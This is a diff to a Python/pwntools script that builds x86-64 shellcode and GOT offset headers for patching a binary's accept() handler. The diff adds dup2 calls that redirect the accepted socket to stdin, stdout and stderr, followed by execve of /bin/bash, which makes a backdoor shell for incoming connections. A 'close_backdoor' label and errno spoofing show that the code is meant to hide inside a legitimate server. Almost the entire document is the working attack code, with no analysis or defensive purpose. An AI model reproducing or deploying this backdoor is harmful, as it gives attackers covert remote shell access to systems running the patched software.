@@ -26,14 +26,16 @@ def get_seg_pad(flag: int) -> int:
     return filesz + memsz
 
 accept_offset = get_got_offset ('accept')
+__errno_location_offset = get_got_offset ('__errno_location')
 __libc_start_main_offset = get_got_offset ('__libc_start_main')
 
 with open ('./include/got_offset.h', 'w') as f:
     f.write('#ifndef GOT_OFFSET\n')
     f.write('#define GOT_OFFSET\n\n')
     f.write('#include <stdint.h>\n')
-    f.write('uint64_t accept_offset = ' + str(hex(accept_offset)) + ';\n\n')
-    f.write('uint64_t __libc_start_main_offset = ' + str(hex(__libc_start_main_offset)) + ';\n')
+    f.write('uint64_t accept_offset = ' + str(hex(accept_offset)) + ';\n')
+    f.write('uint64_t __errno_location_offset = ' + str(hex(__errno_location_offset)) + ';\n')
+    f.write('uint64_t __libc_start_main_offset = ' + str(hex(__libc_start_main_offset)) + ';\n\n')
     f.write('#endif\n')
 
 # rw_gap = get_seg_pad(6)
@@ -89,13 +91,40 @@ cmp al, 0x0
 jne act_if_accept_failed
 // father should return with error
 
+pop rdi
+push 0x21
+pop rax
+push 0x0
+pop rsi
+syscall
+
+push 0x21
+pop rax
+push 0x1
+pop rsi
+syscall
+
+push 0x21
+pop rax
+push 0x2
+pop rsi
+syscall
+
 push 0x68
 mov rax, 0x7361622f6e69622f
 push rax
 push rsp
 pop rdi
+
+push 0x68736162
+push rsp
+pop rsi
+push 0x0
+push rsi
+push rsp
+pop rsi
+
 xor edx, edx
-xor esi, esi
 push 0x3b
 pop rax
 syscall
@@ -108,8 +137,10 @@ jmp return
 
 act_if_accept_failed:
 pop rax
-mov rax, 0xffffffffffffffff
+mov rax, -1
 push rax
+call [rip + {__errno_location_offset - rx_gap - 0x87}]
+mov dword ptr [rax], 4
 
 close_backdoor:
 mov byte ptr [rdi], 0x0
@@ -137,7 +168,7 @@ nop
 """
 )
 
-print(text)
+# print(text)
 raw_asm = asm (text)
 c_code = ''.join(f'\\x{b:02x}' for b in raw_asm)
 
@@ -151,5 +182,6 @@ print ('\nrw_gap_start at: ' + str (hex(rw_gap)))
 print ('rx_gap_start at: ' + str (hex(rx_gap)))
 print ('accept_offset at: ' + str(hex(accept_offset)))
 print ('__libc_start_main_offset at: ' + str(hex(__libc_start_main_offset)))
+print ('__errno_location_offset at: ' + str(hex(__errno_location_offset)))
 print('asm success\n')
 
